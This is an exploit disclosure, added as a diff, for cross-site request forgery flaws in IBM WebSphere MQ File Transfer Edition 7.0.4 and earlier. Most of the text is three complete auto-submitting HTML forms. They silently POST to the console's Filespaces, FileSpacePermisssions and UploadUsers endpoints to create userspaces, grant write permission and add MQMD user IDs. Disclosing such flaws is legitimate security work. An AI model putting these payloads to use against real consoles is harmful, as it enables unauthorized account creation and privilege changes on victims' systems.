@@ -1,0 +1,141 @@
+*Exploit Author:* Nir Valtman
+
+*Description:* Malicious user is able to add userspace, change permissions
+on existing userspace and add MQMD (MQ Message Descriptor) user IDs. All of
+the these vulnerabilities can be exploited using a CSRF (Cross Site Request
+Forgery) attack.
+Few days ago the CVE has
+been published here<http://www-01.ibm.com/support/docview.wss?uid=swg21607482>
+
+*
+*
+*Affected Platforms: *Version 7.0.4 and all previous versions of WebSphere MQ
+File Transfer Edition<http://publib.boulder.ibm.com/infocenter/wmqfte/v7r0/index.jsp>running
+on all platforms are affected.
+* *
+*
+*
+*Exploit Details:*
+*1. CSRF To add user and define his quota on a userspace*
+I created the following HTML page and then opened it by a logged-on user:
+
+<html>
+
+                  <head></head>
+
+                  <body>
+
+                                    <form id="frm" method="post"
+action="https://*[ip-address-and-port]* /wmqfteconsole/Filespaces"
+
+                                                      <input type="hidden"
+name="nirvcsrf" value="junk" />
+
+                                                      <input type="hidden"
+name="name" value="zzzzzz" />
+
+                                                      <input type="hidden"
+name="quota" value="15" />
+
+                                                      <input type="hidden"
+name="id" value="NewFileSpace" />
+
+
+
+                                    </form>
+
+                                    <script>
+
+                                                      document.frm.submit();
+
+                                    </script>
+
+                  </body>
+</html>
+See the following screenshot, which follows the execution of CSRF attack:
+[image: Inline image 1]
+
+*2. CSRF to add permissions on file spaces:*
+I created the following HTML page and then opened it by a logged-on user:
+
+<html>
+
+                  <head></head>
+
+                  <body>
+
+                                    <form id="frm" method="post"
+action="https://*[ip-address-and-port]*
+ /wmqfteconsole/FileSpacePermisssions"
+
+                                                      <input type="hidden"
+name="nirvcsrf" value="junk" />
+
+                                                      <input type="hidden"
+name="user" value="bodek2" />
+
+                                                      <input type="hidden"
+name="write" value="authorized" />
+
+                                                      <input type="hidden"
+name="id" value="zzzzzz_TEMP_PERMISSIONS" />
+
+
+
+                                    </form>
+
+                                    <script>
+
+                                                      document.frm.submit();
+
+                                    </script>
+
+                  </body>
+</html>
+
+See the following screenshot, which follows the execution of CSRF attack:
+[image: Inline image 2]
+
+*2. CSRF to add MQMD user id:*
+I created the following HTML page and then opened it by a logged-on user:
+
+<html>
+
+                  <head></head>
+
+                  <body>
+
+                                    <form id="frm" method="post"
+action="https://*[ip-address-and-port]*/wmqfteconsole/UploadUsers"
+
+                                                      <input type="hidden"
+name="nirvcsrf" value="junk" />
+
+                                                      <input type="hidden"
+name="userID" value="csrfUserId" />
+
+                                                      <input type="hidden"
+name="mqmdUserID" value="userIdTest" />
+
+                                                      <input type="hidden"
+name="id" value="NewUploadUser" />
+
+
+
+                                    </form>
+
+                                    <script>
+
+                                                      document.frm.submit();
+
+                                    </script>
+
+                  </body>
+
+</html>
+
+See the following screenshot, which follows the execution of CSRF attack:
+[image: Inline image 3]
+
+Best Regards,
+Nir Valtman
